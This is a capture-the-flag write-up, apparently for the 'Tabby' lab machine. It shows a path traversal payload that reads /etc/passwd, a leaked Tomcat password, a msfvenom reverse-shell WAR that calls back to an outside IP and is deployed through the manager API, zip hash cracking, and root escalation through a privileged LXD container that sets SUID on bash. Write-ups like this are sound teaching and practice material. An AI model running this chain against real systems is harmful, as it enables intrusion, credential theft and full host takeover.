1, Recon
port scan 
	22/tcp ssh
	80/tcp http
	8080/tcp http
web-content scan
	very sadly, we did not get anything useful and no existed sub-domain.

In the main page only have a useful url `http://megahosting.htb/news.php?file=statement`
And we successfully get the File traversal vulnerability

payload:`http://megahosting.htb/news.php?file=../../../../etc/passwd`
```
/etc/passwd
root:x:0:0:root:/root:/bin/bash
......
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

And when we come to the port 8080, there is a tomcat service 
There is some hints from index page
```
NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in `/etc/tomcat9/tomcat-users.xml`.
```

After guessing around and Googling a bit, I just installed Tomcat with apt install tomcat9. Then I used find to look for tomcat-users.xml, and got two results:
```
find / -name tomcat-users.xml

/usr/share/tomcat9/etc/tomcat-users.xml
/etc/tomcat9/tomcat-users.xml
```

Taking new path to Tabby finds the file (displayed pretty in Firefox view-source):
```
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

Then we can successfully login to admin dashboard.
And we can find the version of tomcat `Apache Tomcat/9.0.31 (Ubuntu)`
`Important: Remote Code Execution via session persistence CVE-2020-9484`

The user tomcat has admin-gui, but not manager-gui, which means I can’t access the manager webapp:
![](images/Pasted%20image%2020240909103238.png)

The tomcat user did have another permission, manager-script. This is to allow access to the text-based web service located at /manager/text. There’s a list of commands here.

Now that I have access to the manager (even if not through the GUI)
```
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list

OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```

We can use msfvenom to create the reverse shell payload and we just need to upload it and exec it.
`msfvenom -p java/shell_reverse_tcp lhost=10.10.14.65 lport=443 -f war -o rev.10.10.14.65-443.war`

`curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/wither --upload-file rev.10.10.14.65-443.war `

Then by enumerate the web directory, we find a backup file and we can crack it
`zip2john 16162020_backup.zip > backup.hash`
`john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt`

We get the credit `admin@it`

But there is nothing useful for us to exploit, but we can try to su  user `ash`

3, shell as root
	There is nothing for  `sudo -l`
when we check `id`
```
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
Every time, when we see the group id `4(adm)`, it means we can check the logs

And group id `lxd` is also interesting.

The basic idea is that I can create a container and mount the root file system on Tabby into the container, where I then have full access to it.

There are currently no containers on the host:
```
lxc list                                                                                                                                                           
+------+-------+------+------+------+-----------+                                        
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |    
+------+-------+------+------+------+-----------+ 
```

```
/snap/bin/lxc image import /dev/shm/alpine-v3.20-x86_64-20240909_1509.tar.gz --alias wither-image

lxc storage create default dir

/snap/bin/lxc init wither-image container-wither -c security.privileged=true -s default

I’ll also mount part of the host file system into the container. This is useful to have a shared folder between the two. I’ll abuse it by mounting the host system root:

lxc config device add container-wither device-wither disk source=/ path=/mnt/root

lxc start container-wither

lxc exec container-wither /bin/sh

Then we can get into the /mnt/root and check the root.txt

cd /mnt/root/usr/bin
ls -l bash
chmod 4755 bash

Then just exit the container and we can get the root bash
/bin/bash -p
```
There are a better way to get the great shell
`https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1`
